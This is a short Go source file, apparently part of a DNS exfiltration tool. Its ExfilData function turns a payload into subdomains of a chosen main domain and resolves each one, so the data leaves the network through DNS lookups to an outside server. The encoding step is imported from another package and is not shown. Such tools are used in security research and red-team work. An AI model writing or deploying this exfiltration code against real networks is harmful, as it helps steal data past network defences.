package messagesending

import (
	"github.com/sam-bee/security-itsalwaysdns/dns_exfil_tool/pkg/messageencoding"
	"log"
)

func ExfilData(exfilPayload string, mainDomain string, dns DnsLookup) {
	domains := domainsToQuery(exfilPayload, mainDomain)
	performDnsLookups(domains, dns)
}

func performDnsLookups(domains []string, dns DnsLookup) {
	for _, domain := range domains {
		ip, err := dns.Lookup(domain)
		if err != nil {
			log.Printf("Error looking up domain %s: %s", domain, err)
		}
		log.Printf("Domain %s resolved to %s", domain, ip)
	}
}

func domainsToQuery(exfilPayload string, mainDomain string) []string {
	return messageencoding.GetDomainsToLookUp(exfilPayload, mainDomain)
}
